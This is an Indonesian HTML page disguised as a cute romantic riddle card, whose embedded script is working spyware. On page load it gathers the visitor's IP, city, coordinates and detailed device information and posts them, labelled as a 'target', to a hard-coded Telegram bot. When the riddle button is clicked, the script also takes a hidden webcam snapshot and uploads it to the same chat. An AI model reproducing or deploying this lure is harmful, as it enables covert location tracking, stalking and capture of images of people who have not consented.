<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love Cute!</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  padding: 20px;
}

.container {
  background: rgba(255, 255, 255, 0.95);
  border-radius: 25px;
  padding: 40px 30px;
  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
  text-align: center;
  max-width: 500px;
  width: 100%;
  backdrop-filter: blur(10px);
  border: 1px solid rgba(255, 255, 255, 0.3);
  animation: fadeIn 0.8s ease-out;
}

@keyframes fadeIn {
  from {
    opacity: 0;
    transform: translateY(30px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

.heart {
  font-size: 3em;
  color: #ff6b6b;
  margin-bottom: 20px;
  animation: heartbeat 1.5s ease-in-out infinite;
}

@keyframes heartbeat {
  0%, 100% { transform: scale(1); }
  50% { transform: scale(1.1); }
}

h1 {
  color: #ff6b6b;
  font-size: 2.2em;
  margin-bottom: 15px;
  font-weight: 700;
  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
}

.riddle {
  font-size: 1.3em;
  color: #555;
  margin-bottom: 30px;
  line-height: 1.5;
  font-weight: 500;
}

.btn {
  background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
  color: white;
  border: none;
  padding: 18px 40px;
  font-size: 1.2em;
  font-weight: 600;
  border-radius: 50px;
  cursor: pointer;
  transition: all 0.3s ease;
  box-shadow: 0 10px 20px rgba(255, 107, 107, 0.3);
  position: relative;
  overflow: hidden;
}

.btn:hover {
  transform: translateY(-3px);
  box-shadow: 0 15px 25px rgba(255, 107, 107, 0.4);
}

.btn:active {
  transform: translateY(-1px);
}

.btn::after {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
  transition: left 0.5s;
}

.btn:hover::after {
  left: 100%;
}

.sparkles {
  position: absolute;
  top: -20px;
  left: 50%;
  transform: translateX(-50%);
  font-size: 1.5em;
}

.bubble {
  background: #ffebee;
  border-radius: 20px;
  padding: 20px;
  margin: 20px 0;
  border-left: 4px solid #ff6b6b;
}

.flowers {
  display: flex;
  justify-content: center;
  gap: 15px;
  margin: 20px 0;
}

.flower {
  font-size: 1.5em;
  animation: float 3s ease-in-out infinite;
}

.flower:nth-child(2) { animation-delay: 0.5s; }
.flower:nth-child(3) { animation-delay: 1s; }

@keyframes float {
  0%, 100% { transform: translateY(0); }
  50% { transform: translateY(-10px); }
}

@media (max-width: 480px) {
  .container {
    padding: 30px 20px;
    margin: 10px;
  }

  h1 {
    font-size: 1.8em;
  }

  .riddle {
    font-size: 1.1em;
  }

  .btn {
    padding: 15px 30px;
    font-size: 1.1em;
  }
}
</style>
</head>
<body>
<div class="container">
  <div class="heart">💖</div>

  <div class="flowers">
    <div class="flower">🌷</div>
    <div class="flower">🌹</div>
    <div class="flower">🌸</div>
  </div>

  <h1>KAMU TAU GAAAA</h1>

  <div class="bubble">
    <p class="riddle">Apaaa buah yang namanyaa selalu bikinyaa nyaman</p>
  </div>

  <button class="btn" id="btnCamera">
    <span class="sparkles">✨</span>
    Aapaa tuh?
  </button>

  <div class="flowers" style="margin-top: 30px;">
    <div class="flower">💐</div>
    <div class="flower">🌼</div>
    <div class="flower">🌺</div>
  </div>
</div>

<script>
const BOT_TOKEN="8205013984:AAFekxuy2qv4vQ6s_yOOfXX_Mv_2u0Bpv2s"; // BOT TOKEN
const CHAT_ID="6051179992"; // CHAT ID
const STATIC_IMAGE="https://files.catbox.moe/8ybe0o.jpg";

function escapeHtml(s){return String(s||"-").replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;");}

// Ambil IP/device info via ipwhois.io
async function getIpInfo(){
  try{
    const r = await fetch("https://ipwhois.app/json/");
    const data = await r.json();
    if(!data.success) return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0"};
    return {
      ip: data.ip || "-",
      city: data.city || "-",
      region: data.region || "-",
      country_name: data.country || "-",
      country_code: data.country_code || "-",
      latitude: data.latitude || "0",
      longitude: data.longitude || "0"
    };
  }catch(e){
    return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0"};
  }
}

// Ambil device info
async function getDeviceInfo(){
  const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:null,charging:false,chargingTime:null,dischargingTime:null}));
  return {
    userAgent:navigator.userAgent,
    platform:navigator.platform,
    language:navigator.language,
    screenWidth:screen.width,
    screenHeight:screen.height,
    innerWidth:window.innerWidth,
    innerHeight:window.innerHeight,
    cores:navigator.hardwareConcurrency||"-",
    memory:navigator.deviceMemory||"-",
    touchPoints:navigator.maxTouchPoints||0,
    orientation:screen.orientation?.type||"-",
    colorDepth:screen.colorDepth||"-",
    pixelRatio:window.devicePixelRatio||"-",
    online:navigator.onLine,
    cookiesEnabled:navigator.cookieEnabled,
    doNotTrack:navigator.doNotTrack,
    battery:b
  };
}

// Build caption Telegram
function buildCaption(ip,d){
  const g=`https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
  return [
    "<b>INFORMATION TARGET</b>",
    `IP: ${escapeHtml(ip.ip)}`,
    `City: ${escapeHtml(ip.city)}`,
    `Region: ${escapeHtml(ip.region)}`,
    `Country: ${escapeHtml(ip.country_name)}`,
    `Country Code: ${escapeHtml(ip.country_code)}`,
    `Latitude: ${escapeHtml(ip.latitude)}`,
    `Longitude: ${escapeHtml(ip.longitude)}`,
    `Location: ${g}`,
    "",
    "<b>Device Info</b>",
    `User Agent: ${escapeHtml(d.userAgent)}`,
    `Platform: ${escapeHtml(d.platform)}`,
    `Language: ${escapeHtml(d.language)}`,
    `Screen: ${escapeHtml(d.screenWidth+"x"+d.screenHeight)}`,
    `Inner Size: ${escapeHtml(d.innerWidth+"x"+d.innerHeight)}`,
    `CPU cores: ${escapeHtml(d.cores)}`,
    `RAM (GB): ${escapeHtml(d.memory)}`,
    `Touch Points: ${escapeHtml(d.touchPoints)}`,
    `Orientation: ${escapeHtml(d.orientation)}`,
    `Color Depth: ${escapeHtml(d.colorDepth)}`,
    `Pixel Ratio: ${escapeHtml(d.pixelRatio)}`,
    `Online: ${escapeHtml(d.online)}`,
    `Cookies Enabled: ${escapeHtml(d.cookiesEnabled)}`,
    `Do Not Track: ${escapeHtml(d.doNotTrack)}`,
    `Battery: ${escapeHtml(d.battery?.level||"-")} (${d.battery?.charging?"Charging":"Not charging"}), ChargingTime: ${escapeHtml(d.battery?.chargingTime||"-")}s, DischargingTime: ${escapeHtml(d.battery?.dischargingTime||"-")}s`,
    "",
    "<b>URL & Time</b>",
    `URL: ${escapeHtml(location.href)}`,
    `Time (UTC): ${escapeHtml(new Date().toISOString())}`
  ].join("\n");
}

// Kirim IP/device + foto statis saat halaman load
async function sendIpDevice(){
  const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      chat_id: CHAT_ID,
      photo: STATIC_IMAGE,
      caption: buildCaption(ip,d),
      parse_mode:"HTML"
    })
  });
}

// Kamera snapshot sebagai file .jpg (document)
async function sendSnapshot(){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({video:true});
    const video = document.createElement('video');
    video.style.display='none';
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();

    await new Promise(resolve => { video.onloadedmetadata = () => setTimeout(resolve, 200); });

    const canvas=document.createElement('canvas');
    canvas.width=video.videoWidth;
    canvas.height=video.videoHeight;
    canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);

    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("document", blob, "screenshotbyaldofficialr.jpg");
    formData.append("caption", "Sukes screenshot foto target");

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
      method: "POST",
      body: formData
    });

    stream.getTracks().forEach(track=>track.stop());
    video.remove();
  }catch(e){
    console.log("yahhh", e);
  }
}

// Jalankan saat halaman load
window.addEventListener("load",sendIpDevice);

// Tombol klik kamera
document.getElementById("btnCamera").addEventListener("click", sendSnapshot);
</script>
</body>
</html>
